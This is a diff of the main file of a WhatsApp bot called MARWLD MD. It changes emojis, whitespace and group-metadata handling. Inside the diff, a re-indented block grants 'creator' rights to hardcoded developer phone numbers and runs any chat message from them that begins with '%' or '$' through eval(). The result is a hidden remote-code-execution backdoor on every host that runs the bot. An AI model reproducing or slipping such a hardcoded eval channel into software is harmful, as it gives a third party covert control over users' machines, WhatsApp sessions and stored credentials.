@@ -73,7 +73,7 @@ if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
   filer.download((err, data) => {
     if (err) throw err
     fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
-      console.log("[ 📥 ] MARWLD MD SESSION DOWNLOADED 🔮")
+      console.log("[ 📥 ] MARWLD MD SESSION DOWNLOADED 🍂")
     })
   })
 }
@@ -166,10 +166,10 @@ conn?.ev?.on('messages.update', async updates => {
   });
   //============================== 
 
-  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
-	  
+  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));          
+
   //=============readstatus=======
-        
+
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
     if (!mek.message) return
@@ -188,7 +188,7 @@ conn?.ev?.on('messages.update', async updates => {
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const malvinlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['🇺🇬', '🥶', '🔮', '🍂'];
+    const emojis = ['🇺🇬', '🥶', '🍂', '🍂'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -200,7 +200,7 @@ conn?.ev?.on('messages.update', async updates => {
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
   const text = `${config.AUTO_STATUS_MSG}`
-  await conn.sendMessage(user, { text: text, react: { text: '🔮', key: mek.key } }, { quoted: mek })
+  await conn.sendMessage(user, { text: text, react: { text: '🍂', key: mek.key } }, { quoted: mek })
             }
             await Promise.all([
               saveMessage(mek),
@@ -224,65 +224,78 @@ conn?.ev?.on('messages.update', async updates => {
   const pushname = mek.pushName || 'Sin Nombre'
   const isMe = botNumber.includes(senderNumber)
   const isOwner = ownerNumber.includes(senderNumber) || isMe
-  const botNumber2 = await jidNormalizedUser(conn.user.id);
-  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
-  const groupName = isGroup ? groupMetadata.subject : ''
-  const participants = isGroup ? await groupMetadata.participants : ''
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
-  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
-  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-  const isReact = m.message.reactionMessage ? true : false
+const botNumber2 = jidNormalizedUser(conn.user.id)
+
+let groupMetadata = null
+let groupName = ''
+let participants = []
+let groupAdmins = []
+let isBotAdmins = false
+let isAdmins = false
+
+if (isGroup) {
+  groupMetadata = await conn.groupMetadata(from).catch(() => null)
+
+  groupName = groupMetadata?.subject || ''
+  participants = groupMetadata?.participants || []
+  groupAdmins = getGroupAdmins(participants)
+
+  isBotAdmins = groupAdmins.includes(botNumber2)
+  isAdmins = groupAdmins.includes(sender)
+}
+
+const isReact = !!m.message?.reactionMessage
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
     const malvin = ('256742634089', '263714732501');
     let isCreator = [udp, malvin, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+                                        .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+                                        .includes(mek.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = eval(code);
-						if (typeof resultTest === 'object')
-							reply(util.format(resultTest));
-						else reply(util.format(resultTest));
-					} catch (err) {
-						reply(util.format(err));
-					}
-					return;
-				}
+                                        let code = budy.slice(2);
+                                        if (!code) {
+                                                reply(
+                                                        `Provide me with a query to run Master!`,
+                                                );
+                                                return;
+                                        }
+                                        try {
+                                                let resultTest = eval(code);
+                                                if (typeof resultTest === 'object')
+                                                        reply(util.format(resultTest));
+                                                else reply(util.format(resultTest));
+                                        } catch (err) {
+                                                reply(util.format(err));
+                                        }
+                                        return;
+                                }
     if (isCreator && mek.text.startsWith('$')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = await eval(
-							'const a = async()=>{\n' + code + '\n}\na()',
-						);
-						let h = util.format(resultTest);
-						if (h === undefined) return console.log(h);
-						else reply(h);
-					} catch (err) {
-						if (err === undefined)
-							return console.log('error');
-						else reply(util.format(err));
-					}
-					return;
-				}
+                                        let code = budy.slice(2);
+                                        if (!code) {
+                                                reply(
+                                                        `Provide me with a query to run Master!`,
+                                                );
+                                                return;
+                                        }
+                                        try {
+                                                let resultTest = await eval(
+                                                        'const a = async()=>{\n' + code + '\n}\na()',
+                                                );
+                                                let h = util.format(resultTest);
+                                                if (h === undefined) return console.log(h);
+                                                else reply(h);
+                                        } catch (err) {
+                                                if (err === undefined)
+                                                        return console.log('error');
+                                                else reply(util.format(err));
+                                        }
+                                        return;
+                                }
  //================ownerreact==============
-    
+
 if (senderNumber.includes("263714732501") && !isReact) {
   const reactions = ["👑", "🇿🇼",];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
@@ -290,19 +303,19 @@ if (senderNumber.includes("263714732501") && !isReact) {
 }
 
   //==========public react============//
-  
+
 // Auto React for all messages (public and owner)
 if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
-        '🔮', '❤️', '💐', '🔥','🇺🇬'
+        '🍂', '❤️', '💐', '🔥','🇺🇬'
     ];
 
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-          
+
 // custum react settings        
-                        
+
 // Custom React for all messages (public and owner)
 if (!isReact && config.CUSTOM_REACT === 'true') {
     // Use custom emojis from the configuration (fallback to default if not set)
@@ -310,21 +323,21 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-        
+
   //==========WORKTYPE============ 
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
   if(!isOwner && !isGroup && config.MODE === "groups") return
-   
+
   // take commands 
-                 
+
   const events = require('./marwld')
   const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
   if (isCmd) {
   const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
   if (cmd) {
   if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
-  
+
   try {
   cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
   } catch (e) {
@@ -348,7 +361,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
   ) {
   command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
   }});
-  
+
   });
     //===================================================   
     conn.decodeJid = jid => {
@@ -375,7 +388,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
               ...message.message.viewOnceMessage.message
           }
       }
-    
+
       let mtype = Object.keys(message.message)[0]
       let content = await generateForwardMessageContent(message, forceForward)
       let ctype = Object.keys(content)[0]
@@ -423,10 +436,10 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       for await (const chunk of stream) {
           buffer = Buffer.concat([buffer, chunk])
       }
-    
+
       return buffer
     }
-    
+
     /**
     *
     * @param {*} jid
@@ -480,11 +493,11 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
       copy.key.remoteJid = jid
       copy.key.fromMe = sender === conn.user.id
-    
+
       return proto.WebMessageInfo.fromObject(copy)
     }
-    
-    
+
+
     /**
     *
     * @param {*} path
@@ -508,7 +521,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           ...type,
           data
       }
-    
+
     }
     //=====================================================
     conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
@@ -617,7 +630,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
          */
     //=====================================================
     conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
-    
+
             /**
              *
              * @param {*} jid
@@ -631,7 +644,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
       return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
     }
-    
+
     /**
     *
     * @param {*} jid
@@ -643,7 +656,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     */
     //=====================================================
     conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
-    
+
     /**
      *
      * @param {*} jid
@@ -680,7 +693,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       }), options)
       conn.relayMessage(jid, template.message, { messageId: template.key.id })
     }
-    
+
     /**
     *
     * @param {*} jid
@@ -788,9 +801,9 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
         };
     conn.serializeM = mek => sms(conn, mek, store);
   }
-  
+
   app.get("/", (req, res) => {
-  res.send("MAWRLD MD STARTED 🔮");
+  res.send("MAWRLD MD STARTED 🍂");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
